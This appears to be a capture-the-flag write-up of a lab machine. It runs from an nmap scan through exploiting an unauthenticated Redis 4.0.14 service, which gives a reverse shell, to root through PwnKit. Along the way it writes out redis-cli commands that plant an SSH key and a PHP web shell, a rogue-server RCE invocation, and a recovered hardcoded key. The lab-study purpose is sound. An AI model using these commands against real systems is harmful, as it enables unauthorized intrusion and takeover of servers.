`nmap -A -T4 -p- 192.168.110.176`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   53.54 ms 192.168.45.1
2   53.52 ms 192.168.45.254
3   54.72 ms 192.168.251.1
4   54.79 ms 192.168.110.176
```


We only really have one port open that we will work with since SSH is normally not the first initial vector. I found this resource for [redis enumeration](https://hackviser.com/tactics/pentesting/services/redis) as I have not worked with it before. At the bottom of the page it has a guide on unauthorized ssh access so lets try that first.

```
$ ssh-keygen -t ecdsa -b 521 -f key
$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
$ redis-cli -h 192.168.110.176 flushall
$ cat key.txt | redis-cli -h 192.168.110.176 -x set pwn
$ redis-cli -h 192.168.110.176 config set dbfilename authorized_keys
$ redis-cli -h 192.168.110.176 config set dir /var/lib/redis/.ssh
$ redis-cli -h 192.168.110.176 save
```

That most certainly did not work as I got a permissions error when trying to set directory to `.ssh` so lets try the other option.

```
$ redis-cli -h 192.168.110.176 flushall
$ redis-cli -h 192.168.110.176 set pwn '<?php system($_REQUEST['cmd']); ?>'
$ redis-cli -h 192.168.110.176 config set dbfilename shell.php
$ redis-cli -h 192.168.110.176 config set dir /var/www/html
$ redis-cli -h 192.168.110.176 save
```

Those didn't work so I found a new resource [here](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)which led me to find this [RCE](https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de---------------------------------------) lets test this POC to see if we can get a foothold.

```
python3 redis-rogue-server.py --rhost 192.168.110.176 --lhost 192.168.45.244
```

![](Images/Pasted%20image%2020250510103218.png)

We chose from the compiled exploit to generate a reverse shell on port 22. Which it was able to do successfully.

![](Images/Pasted%20image%2020250510103248.png)

Quickly upgrade our shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

Time to start enumerating the system to see what we can do. But first since we got in as a user we can quickly grab the local flag.

![](Images/Pasted%20image%2020250510103407.png)

Lets try and do some manual enumeration before loading up linpeas. In the users directory is just a text file explaining why we were able to get our shell.

![](Images/Pasted%20image%2020250510103529.png)

We found that root is allowed to run the following without a password

![](Images/Pasted%20image%2020250510103625.png)

Lets check GTFOBins to see if there is anything about this. Doesn't appear to be our vector. Lets load up linpeas and see if it catches anything big. Well it seems that it was crashing the box. Lets look further into redis-status to see what it does before I completely write it off.

It appears that the binary is requesting a key when trying to execute the file.

![](Images/Pasted%20image%2020250510104713.png)

From my experience doing CTFs always check the binary to see if the key is hardcoded.

```
strings /usr/local/bin/redis-status
```

Which gave us a key.

![](Images/Pasted%20image%2020250510104825.png)

```
ClimbingParrotKickingDonkey321
```

Lets run the binary again and see what it does with proper authentication. That didn't really give anything besides doing systemctl for the status. After getting stuck I ended up just loading PwnKit from the linpeas output as I could not seem to find the proper escalation path.

```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

Grab [PwnKit](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)and transfer it over to the target and execute it.

![](Images/Pasted%20image%2020250510110346.png)

After grabbing the root flag I found a wonderful writeup on what appears to be the intended solution which is a Buffer Overflow attack on the redis-status binary which can be found [here](https://markuched13.github.io/posts/pg/blackgate.html)Since BoF have been removed from the OSCP exam I don't feel too bad about skipping this attack chain.








